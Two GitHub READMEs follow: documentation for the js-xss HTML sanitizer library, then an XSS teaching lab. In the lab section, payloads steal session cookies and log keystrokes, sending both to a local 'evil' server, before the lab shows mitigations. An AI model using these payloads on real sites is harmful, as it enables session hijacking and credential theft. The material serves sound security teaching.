
##
#
https://github.com/leizongmin/js-xss
#
##

[![NPM version][npm-image]][npm-url]
[![Node.js CI](https://github.com/leizongmin/js-xss/actions/workflows/nodejs.yml/badge.svg)](https://github.com/leizongmin/js-xss/actions/workflows/nodejs.yml)
[![Test coverage][coveralls-image]][coveralls-url]
[![David deps][david-image]][david-url]
[![node version][node-image]][node-url]
[![npm download][download-image]][download-url]
[![npm license][license-image]][download-url]

[npm-image]: https://img.shields.io/npm/v/xss.svg?style=flat-square
[npm-url]: https://npmjs.org/package/xss
[coveralls-image]: https://img.shields.io/coveralls/leizongmin/js-xss.svg?style=flat-square
[coveralls-url]: https://coveralls.io/r/leizongmin/js-xss?branch=master
[david-image]: https://img.shields.io/david/leizongmin/js-xss.svg?style=flat-square
[david-url]: https://david-dm.org/leizongmin/js-xss
[node-image]: https://img.shields.io/badge/node.js-%3E=_0.10-green.svg?style=flat-square
[node-url]: http://nodejs.org/download/
[download-image]: https://img.shields.io/npm/dm/xss.svg?style=flat-square
[download-url]: https://npmjs.org/package/xss
[license-image]: https://img.shields.io/npm/l/xss.svg

# Sanitize untrusted HTML (to prevent XSS) with a configuration specified by a Whitelist.

[![Greenkeeper badge](https://badges.greenkeeper.io/leizongmin/js-xss.svg)](https://greenkeeper.io/)

![xss](https://nodei.co/npm/xss.png?downloads=true&stars=true)

---

`xss` is a module used to filter input from users to prevent XSS attacks.
([What is XSS attack?](http://en.wikipedia.org/wiki/Cross-site_scripting))

**Project Homepage:** http://jsxss.com

**Try Online:** http://jsxss.com/en/try.html

**[中文版文档](https://github.com/leizongmin/js-xss/blob/master/README.zh.md)**

---

## Features

- Specifies HTML tags and their attributes allowed with whitelist
- Handle any tags or attributes using custom function.

## Reference

- [XSS Filter Evasion Cheat Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)
- [Data URI scheme](http://en.wikipedia.org/wiki/Data_URI_scheme)
- [XSS with Data URI Scheme](http://hi.baidu.com/badzzzz/item/bdbafe83144619c199255f7b)

## Benchmark (for references only)

- the xss module: 22.53 MB/s
- `xss()` function from module `validator@0.3.7`: 6.9 MB/s

For test code please refer to `benchmark` directory.

## They are using xss module

- **nodeclub** - A Node.js bbs using MongoDB - https://github.com/cnodejs/nodeclub
- **cnpmjs.org** - Private npm registry and web for Enterprise - https://github.com/cnpm/cnpmjs.org
- **cocalc.com** - Collaborative Calculation and Data Science - https://cocalc.com

## Install

### NPM

```bash
npm install xss
```

### Bower

```bash
bower install xss
```

Or

```bash
bower install https://github.com/leizongmin/js-xss.git
```

## Usages

### On Node.js

```javascript
var xss = require("xss");
var html = xss('<script>alert("xss");</script>');
console.log(html);
```

### On Browser

Shim mode (reference file `test/test.html`):

```html
<script src="https://rawgit.com/leizongmin/js-xss/master/dist/xss.js"></script>
<script>
  // apply function filterXSS in the same way
  var html = filterXSS('<script>alert("xss");</scr' + "ipt>");
  alert(html);
</script>
```

AMD mode - shim:

```html
<script>
  require.config({
    baseUrl: "./",
    paths: {
      xss: "https://rawgit.com/leizongmin/js-xss/master/dist/xss.js",
    },
    shim: {
      xss: { exports: "filterXSS" },
    },
  });
  require(["xss"], function (xss) {
    var html = xss('<script>alert("xss");</scr' + "ipt>");
    alert(html);
  });
</script>
```

**Notes: please don't use the URL https://rawgit.com/leizongmin/js-xss/master/dist/xss.js in production environment.**

## Command Line Tool

### Process File

You can use the xss command line tool to process a file. Usage:

```bash
xss -i <input_file> -o <output_file>
```

Example:

```bash
xss -i origin.html -o target.html
```

### Active Test

Run the following command, them you can type HTML
code in the command-line, and check the filtered output:

```bash
xss -t
```

For more details, please run `$ xss -h` to see it.

## Custom filter rules

When using the `xss()` function, the second parameter could be used to specify
custom rules:

```javascript
options = {}; // Custom rules
html = xss('<script>alert("xss");</script>', options);
```

To avoid passing `options` every time, you can also do it in a faster way by
creating a `FilterXSS` instance:

```javascript
options = {}; // Custom rules
myxss = new xss.FilterXSS(options);
// then apply myxss.process()
html = myxss.process('<script>alert("xss");</script>');
```

Details of parameters in `options` would be described below.

### Whitelist

By specifying a `whiteList`, e.g. `{ 'tagName': [ 'attr-1', 'attr-2' ] }`. Tags
and attributes not in the whitelist would be filter out. For example:

```javascript
// only tag a and its attributes href, title, target are allowed
var options = {
  whiteList: {
    a: ["href", "title", "target"],
  },
};
// With the configuration specified above, the following HTML:
// <a href="#" onclick="hello()"><i>Hello</i></a>
// would become:
// <a href="#">&lt;i&gt;Hello&lt;/i&gt;</a>
```

For the default whitelist, please refer `xss.whiteList`.

`allowList` is also supported, and has the same function as `whiteList`.

### Customize the handler function for matched tags

By specifying the handler function with `onTag`:

```javascript
function onTag(tag, html, options) {
  // tag is the name of current tag, e.g. 'a' for tag <a>
  // html is the HTML of this tag, e.g. '<a>' for tag <a>
  // options is some addition informations:
  //   isWhite    boolean, whether the tag is in whitelist
  //   isClosing  boolean, whether the tag is a closing tag, e.g. true for </a>
  //   position        integer, the position of the tag in output result
  //   sourcePosition  integer, the position of the tag in input HTML source
  // If a string is returned, the current tag would be replaced with the string
  // If return nothing, the default measure would be taken:
  //   If in whitelist: filter attributes using onTagAttr, as described below
  //   If not in whitelist: handle by onIgnoreTag, as described below
}
```

### Customize the handler function for attributes of matched tags

By specifying the handler function with `onTagAttr`:

```javascript
function onTagAttr(tag, name, value, isWhiteAttr) {
  // tag is the name of current tag, e.g. 'a' for tag <a>
  // name is the name of current attribute, e.g. 'href' for href="#"
  // isWhiteAttr whether the attribute is in whitelist
  // If a string is returned, the attribute would be replaced with the string
  // If return nothing, the default measure would be taken:
  //   If in whitelist: filter the value using safeAttrValue as described below
  //   If not in whitelist: handle by onIgnoreTagAttr, as described below
}
```

### Customize the handler function for tags not in the whitelist

By specifying the handler function with `onIgnoreTag`:

```javascript
function onIgnoreTag(tag, html, options) {
  // Parameters are the same with onTag
  // If a string is returned, the tag would be replaced with the string
  // If return nothing, the default measure would be taken (specifies using
  // escape, as described below)
}
```

### Customize the handler function for attributes not in the whitelist

By specifying the handler function with `onIgnoreTagAttr`:

```javascript
function onIgnoreTagAttr(tag, name, value, isWhiteAttr) {
  // Parameters are the same with onTagAttr
  // If a string is returned, the value would be replaced with this string
  // If return nothing, then keep default (remove the attribute)
}
```

### Customize escaping function for HTML

By specifying the handler function with `escapeHtml`. Following is the default
function **(Modification is not recommended)**:

```javascript
function escapeHtml(html) {
  return html.replace(/</g, "&lt;").replace(/>/g, "&gt;");
}
```

### Customize escaping function for value of attributes

By specifying the handler function with `safeAttrValue`:

```javascript
function safeAttrValue(tag, name, value) {
  // Parameters are the same with onTagAttr (without options)
  // Return the value as a string
}
```

### Customize CSS filter

If you allow the attribute `style`, the value will be processed by [cssfilter](https://github.com/leizongmin/js-css-filter) module. The cssfilter module includes a default css whitelist. You can specify the options for cssfilter module like this:

```javascript
myxss = new xss.FilterXSS({
  css: {
    whiteList: {
      position: /^fixed|relative$/,
      top: true,
      left: true,
    },
  },
});
html = myxss.process('<script>alert("xss");</script>');
```

If you don't want to filter out the `style` content, just specify `false` to the `css` option:

```javascript
myxss = new xss.FilterXSS({
  css: false,
});
```

For more help, please see https://github.com/leizongmin/js-css-filter

### Quick Start

#### Filter out tags not in the whitelist

By using `stripIgnoreTag` parameter:

- `true` filter out tags not in the whitelist
- `false`: by default: escape the tag using configured `escape` function

Example:

If `stripIgnoreTag = true` is set, the following code:

```html
code:
<script>
  alert(/xss/);
</script>
```

would output filtered:

```html
code:alert(/xss/);
```

#### Filter out tags and tag bodies not in the whitelist

By using `stripIgnoreTagBody` parameter:

- `false|null|undefined` by default: do nothing
- `'*'|true`: filter out all tags not in the whitelist
- `['tag1', 'tag2']`: filter out only specified tags not in the whitelist

Example:

If `stripIgnoreTagBody = ['script']` is set, the following code:

```html
code:
<script>
  alert(/xss/);
</script>
```

would output filtered:

```html
code:
```

#### Filter out HTML comments

By using `allowCommentTag` parameter:

- `true`: do nothing
- `false` by default: filter out HTML comments

Example:

If `allowCommentTag = false` is set, the following code:

```html
code:<!-- something -->
END
```

would output filtered:

```html
code: END
```

## Examples

### Allow attributes of whitelist tags start with `data-`

```javascript
var source = '<div a="1" b="2" data-a="3" data-b="4">hello</div>';
var html = xss(source, {
  onIgnoreTagAttr: function (tag, name, value, isWhiteAttr) {
    if (name.substr(0, 5) === "data-") {
      // escape its value using built-in escapeAttrValue function
      return name + '="' + xss.escapeAttrValue(value) + '"';
    }
  },
});

console.log("%s\nconvert to:\n%s", source, html);
```

Result:

```html
<div a="1" b="2" data-a="3" data-b="4">hello</div>
convert to:
<div data-a="3" data-b="4">hello</div>
```

### Allow tags start with `x-`

```javascript
var source = "<x><x-1>he<x-2 checked></x-2>wwww</x-1><a>";
var html = xss(source, {
  onIgnoreTag: function (tag, html, options) {
    if (tag.substr(0, 2) === "x-") {
      // do not filter its attributes
      return html;
    }
  },
});

console.log("%s\nconvert to:\n%s", source, html);
```

Result:

```html
<x
  ><x-1>he<x-2 checked></x-2>wwww</x-1
  ><a>
    convert to: &lt;x&gt;<x-1>he<x-2 checked></x-2>wwww</x-1><a></a></a
></x>
```

### Parse images in HTML

```javascript
var source =
  '<img src="img1">a<img src="img2">b<img src="img3">c<img src="img4">d';
var list = [];
var html = xss(source, {
  onTagAttr: function (tag, name, value, isWhiteAttr) {
    if (tag === "img" && name === "src") {
      // Use the built-in friendlyAttrValue function to escape attribute
      // values. It supports converting entity tags such as &lt; to printable
      // characters such as <
      list.push(xss.friendlyAttrValue(value));
    }
    // Return nothing, means keep the default handling measure
  },
});

console.log("image list:\n%s", list.join(", "));
```

Result:

```html
image list: img1, img2, img3, img4
```

### Filter out HTML tags (keeps only plain text)

```javascript
var source = "<strong>hello</strong><script>alert(/xss/);</script>end";
var html = xss(source, {
  whiteList: {}, // empty, means filter out all tags
  stripIgnoreTag: true, // filter out all HTML not in the whitelist
  stripIgnoreTagBody: ["script"], // the script tag is a special case, we need
  // to filter out its content
});

console.log("text: %s", html);
```

Result:

```html
text: helloend
```

## License

```text
Copyright (c) 2012-2018 Zongmin Lei(雷宗民) <leizongmin@gmail.com>
http://ucdok.com

The MIT License

Permission is hereby granted, free of charge, to any person obtaining
a copy of this software and associated documentation files (the
"Software"), to deal in the Software without restriction, including
without limitation the rights to use, copy, modify, merge, publish,
distribute, sublicense, and/or sell copies of the Software, and to
permit persons to whom the Software is furnished to do so, subject to
the following conditions:

The above copyright notice and this permission notice shall be
included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE
LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION
OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION
WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
```



##
#
https://github.com/Learn-by-doing/xss
#
##

# Cross-site Scripting (XSS)

Example cross-site scripting vulnerabilities in action.


## Requirements

* [Node.js](https://nodejs.org/en/) - you can use either version (LTS or latest)
  * For Windows - use the installation package from the node website
  * For Linux and Mac - use [nvm](https://github.com/creationix/nvm) to install node
* [Git](https://git-scm.com/downloads)


## Getting Started

If you have not already done so, make sure you have all the [requirements](#requirements) from above.

For Windows users, open Git Bash. You will use this program to run all the "terminal" commands you see in the rest of this guide.

For Linux and Mac users, open Terminal.

Now let's get started. In your terminal program, use git to download the project:
```bash
git clone https://github.com/Learn-by-doing/xss.git
```
If successful, a new folder named `xss` should have been created.

Change directory into the new folder:
```bash
cd xss
```

Install the project's dependencies using npm:
```bash
npm install
```

Now we can run the local web server using Node.js:
```bash
node server.js
```
If successful, you should see the following message: `Server listening at localhost:3000`. This means that a local web server is now running and is listening for requests at [localhost:3000](http://localhost:3000/). Open your browser and click the link.

You should see a simple search form. Enter some text then press enter (or click the "search" button). Notice how the search query you entered is shown in the page. This form might be vulnerable to an XSS attack. So let's test it ;)


## What is XSS?

From [OWASP](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)):

> Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted web sites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user.

XSS vulnerabilities are generally used to steal sensitive information (login credentials, authentication tokens, personal user data) as well as perform actions on behalf of authenticated users.


## Proof of Concept

Open the developer tools in your browser (F12) and open the "Console" sub-tab.

Copy/paste the following code into the console and run it:
```js
encodeURIComponent('<img src="does-not-exist" onerror="alert(\'hi!\')">');
```

![](screenshots/xss-screenshot-001.png)

Copy the output and paste it into the address bar so that the URL looks like this:
```
http://localhost:3000/?q=%3Cimg%20src%3D%22does-not-exist%22%20onerror%3D%22alert('hi!')%22%3E
```
Or you can click [this link](http://localhost:3000/?q=%3Cimg%20src%3D%22does-not-exist%22%20onerror%3D%22alert('hi')%22%3E).

If successful, you should see an alert pop-up that says "hi!".

Let's see what else we can do..


## Exploitation

Open the "Application" sub-tab in your browser's developer tools. Under "Storage" -> "Cookies", click "localhost:3000" to show the cookies being saved by the browser for this website.

![](screenshots/xss-screenshot-002.png)

Notice how there is a cookie named "connect.sid". This is a session cookie set by our local web server. Is it possible for us to access this via the XSS vulnerability? Let's try. Repeat the steps from the "Proof of Concept" section above, but with the following code:
```html
<img src="does-not-exist" onerror="alert(document.cookie)">
```
Encode the above HTML and use it as the search query, or [try this link](http://localhost:3000/?q=%3Cimg%20src%3D%22does-not-exist%22%20onerror%3D%22alert(document.cookie)%22%3E).

If successful, you should see the contents of the session cookie printed in an alert pop-up.

Now before continuing, we will need to start our "evil" web server. Run the following command in a second terminal window:
```bash
node evil-server.js
```

And now try to use the following code with the XSS vulnerability to steal the session cookie:
```html
<img src="does-not-exist" onerror="var img = document.createElement(\'img\'); img.src = \'http://localhost:3001/cookie?data=\' + document.cookie; document.querySelector(\'body\').appendChild(img);">
```
Encode the above HTML and use it as the search query, or [try this link](http://localhost:3000/?q=%3Cimg%20src%3D%22does-not-exist%22%20onerror%3D%22var%20img%20%3D%20document.createElement(%27img%27)%3B%20img.src%20%3D%20%27http%3A%2F%2Flocalhost%3A3001%2Fcookie%3Fdata%3D%27%20%2B%20document.cookie%3B%20document.querySelector(%27body%27).appendChild(img)%3B%22%3E).

Check the terminal window of the evil server. Do you see the contents of the session cookie?

Fun times!

Here's the JavaScript code from the last example in a readable form:
```js
var img = document.createElement('img');
img.src = 'http://localhost:3001/cookie?data=' + document.cookie;
document.querySelector('body').appendChild(img);
```

Now let's get even more nasty. Let's try a key-logger:
```html
<img src="does-not-exist" onerror="var timeout; var buffer = \'\'; document.querySelector(\'body\').addEventListener(\'keypress\', function(event) { if (event.which !== 0) { clearTimeout(timeout); buffer += String.fromCharCode(event.which); timeout = setTimeout(function() { var xhr = new XMLHttpRequest(); var uri = \'http://localhost:3001/keys?data=\' + encodeURIComponent(buffer); xhr.open(\'GET\', uri); xhr.send(); buffer = \'\'; }, 400); } });">
```
Encode the above HTML and use it as the search query, or [try this link](http://localhost:3000/?q=%3Cimg%20src%3D%22does-not-exist%22%20onerror%3D%22var%20timeout%3B%20var%20buffer%20%3D%20%27%27%3B%20document.querySelector(%27body%27).addEventListener(%27keypress%27%2C%20function(event)%20%7B%20if%20(event.which%20!%3D%3D%200)%20%7B%20clearTimeout(timeout)%3B%20buffer%20%2B%3D%20String.fromCharCode(event.which)%3B%20timeout%20%3D%20setTimeout(function()%20%7B%20var%20xhr%20%3D%20new%20XMLHttpRequest()%3B%20var%20uri%20%3D%20%27http%3A%2F%2Flocalhost%3A3001%2Fkeys%3Fdata%3D%27%20%2B%20encodeURIComponent(buffer)%3B%20xhr.open(%27GET%27%2C%20uri)%3B%20xhr.send()%3B%20buffer%20%3D%20%27%27%3B%20%7D%2C%20400)%3B%20%7D%20%7D)%3B%22%3E).

Here's the JavaScript code from the last example in a readable form:
```js
var timeout;
var buffer = '';
document.querySelector('body').addEventListener('keypress', function(event) {
	if (event.which !== 0) {
		clearTimeout(timeout);
		buffer += String.fromCharCode(event.which);
		timeout = setTimeout(function() {
			var xhr = new XMLHttpRequest();
			var uri = 'http://localhost:3001/keys?data=' + encodeURIComponent(buffer);
			xhr.open('GET', uri);
			xhr.send();
			buffer = '';
		}, 400);
	}
});
```

These are very primitive examples, but I think you can see the potential.


## So Why is this Bad?

Imagine instead of localhost:3000, this was your bank's website. And you see a link in an official-looking email. What happens if you click that link? You might be running some malicious code in the context of your bank's website. Not such a big deal if you aren't logged in at that moment. But what if you are? Or what if you enter your login credentials on the page with the malicious code? Beginning to feel a bit paranoid? Good :)


## Mitigation

Let's stop scaring you for a moment and see if we can fix this. In this example project, at the root, the XSS vulnerability is caused by inserting unsafe ("unescaped") HTML into the page. In the `public/index.html` file, you will find the following function:
```js
function showQueryAndResults(q, results) {

	var resultsEl = document.querySelector('#results');
	var html = '';

	html += '<p>Your search query:</p>';
	html += '<pre>' + q + '</pre>';
	html += '<ul>';

	for (var index = 0; index < results.length; index++) {
		html += '<li>' + results[index] + '</li>';
	}

	html += '</ul>';

	resultsEl.innerHTML = html;
}
```
This function is taking the search query (`q`) and inserting it as HTML into the `<div id="results"></div>` element. And since HTML allows JavaScript to be run inline via a number of different attributes, this provides a nice opportunity for XSS.

There are a number of techniques we can use to prevent this particular XSS vulnerability.

We can change our application/website code to treat user input (the `q` parameter) strictly as text content. For example, here is a fixed up version of the above function:
```js
function showQueryAndResults(q, results) {

	var resultsEl = document.querySelector('#results');
	var html = '';

	html += '<p>Your search query:</p>';
	html += '<pre></pre>';
	html += '<ul>';

	for (var index = 0; index < results.length; index++) {
		html += '<li>' + results[index] + '</li>';
	}

	html += '</ul>';

	resultsEl.innerHTML = html;

	var queryTextEl = document.querySelector('#results pre');
	queryTextEl.textContent = q;
}
```
Replace the function in your index.html with this fixed version and try the XSS proof-of-concept again. Now the HTML is printed as text and the alert pop-up is not shown. Great, we fixed this vulnerability! But that's just this vulnerability. There could be more in the rest of our code.

Another technique we can use is [Content Security Policy](https://www.owasp.org/index.php/Content_Security_Policy) declarations to instruct the browser which types of code to run (and from where).

For example, we can instruct the browser to only run JavaScript code from source files on the same domain. To do this, we add a special meta tag to the head of our HTML document:
```
<meta http-equiv="Content-Security-Policy" content="default-src 'self'">
```
But adding this tag to our index.html will break our page, because it disallows the inline JavaScript from running. To fix this, we will need to move our JavaScript to a separate file (ie. `search.js`).

This is a very good solution to stop most XSS vulnerabilities from becoming harmful. But there is a major issue. Most applications will break when suddenly adding these directives. Changes have to be made to get the applications working again.

